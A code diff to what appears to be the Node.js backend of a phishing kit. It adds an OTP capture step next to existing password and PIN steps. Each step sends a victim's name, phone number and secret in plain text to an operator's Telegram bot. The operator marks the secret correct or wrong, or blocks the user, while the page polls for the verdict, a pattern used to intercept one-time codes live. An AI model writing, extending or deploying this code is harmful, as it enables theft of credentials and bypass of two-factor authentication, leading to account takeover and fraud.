@@ -9,6 +9,7 @@ const DOMAIN = process.env.BACKEND_DOMAIN;
 
 // ---------------- MEMORY STORES ----------------
 const passwordRequests = {};
+const otpRequests = {};
 const pinRequests = {};
 const blockedRequests = {};
 const requestMeta = {}; // requestId → { name, phone, botId }
@@ -92,14 +93,9 @@ async function setAllWebhooks() {
 // ---------------- PASSWORD STEP ----------------
 app.post('/submit-password', (req, res) => {
   try {
-    console.log('📥 PASSWORD SUBMIT:', req.body);
-
     const { name, phone, password, botId } = req.body;
     const bot = getBot(botId);
-
-    if (!bot) {
-      return res.status(400).json({ error: 'Invalid bot' });
-    }
+    if (!bot) return res.status(400).json({ error: 'Invalid bot' });
 
     const requestId = uuidv4();
     passwordRequests[requestId] = null;
@@ -120,9 +116,7 @@ app.post('/submit-password', (req, res) => {
     );
 
     res.json({ requestId });
-
-  } catch (err) {
-    console.error('❌ submit-password error:', err);
+  } catch {
     res.status(500).json({ error: 'Internal server error' });
   }
 });
@@ -131,17 +125,47 @@ app.get('/check-password/:id', (req, res) => {
   res.json({ approved: passwordRequests[req.params.id] ?? null });
 });
 
+// ---------------- OTP STEP ----------------
+app.post('/submit-otp', (req, res) => {
+  try {
+    const { name, phone, otp, botId } = req.body;
+    const bot = getBot(botId);
+    if (!bot) return res.status(400).json({ error: 'Invalid bot' });
+
+    const requestId = uuidv4();
+    otpRequests[requestId] = null;
+    requestMeta[requestId] = { name, phone, botId };
+
+    sendTelegram(
+      bot,
+      `🔐 OTP VERIFICATION
+
+👤 Name: ${name}
+📞 Phone: ${phone}
+🔢 OTP: ${otp}
+🆔 Ref: ${requestId}`,
+      [[
+        { text: '✅ Correct OTP', callback_data: `otp_ok:${requestId}` },
+        { text: '❌ Wrong OTP', callback_data: `otp_bad:${requestId}` }
+      ]]
+    );
+
+    res.json({ requestId });
+  } catch {
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+app.get('/check-otp/:id', (req, res) => {
+  res.json({ approved: otpRequests[req.params.id] ?? null });
+});
+
 // ---------------- PIN STEP ----------------
 app.post('/submit-pin', (req, res) => {
   try {
-    console.log('📥 PIN SUBMIT:', req.body);
-
     const { name, phone, pin, botId } = req.body;
     const bot = getBot(botId);
-
-    if (!bot) {
-      return res.status(400).json({ error: 'Invalid bot' });
-    }
+    if (!bot) return res.status(400).json({ error: 'Invalid bot' });
 
     const requestId = uuidv4();
     pinRequests[requestId] = null;
@@ -163,9 +187,7 @@ app.post('/submit-pin', (req, res) => {
     );
 
     res.json({ requestId });
-
-  } catch (err) {
-    console.error('❌ submit-pin error:', err);
+  } catch {
     res.status(500).json({ error: 'Internal server error' });
   }
 });
@@ -191,6 +213,10 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
 
   if (action === 'pass_ok') { passwordRequests[requestId] = true; feedback = '✅ Password approved'; }
   if (action === 'pass_bad') { passwordRequests[requestId] = false; feedback = '❌ Password rejected'; }
+
+  if (action === 'otp_ok') { otpRequests[requestId] = true; feedback = '✅ OTP approved'; }
+  if (action === 'otp_bad') { otpRequests[requestId] = false; feedback = '❌ OTP rejected'; }
+
   if (action === 'pin_ok') { pinRequests[requestId] = true; feedback = '✅ PIN approved'; }
   if (action === 'pin_bad') { pinRequests[requestId] = false; feedback = '❌ PIN rejected'; }
   if (action === 'pin_block') { blockedRequests[requestId] = true; feedback = '🛑 User blocked'; }
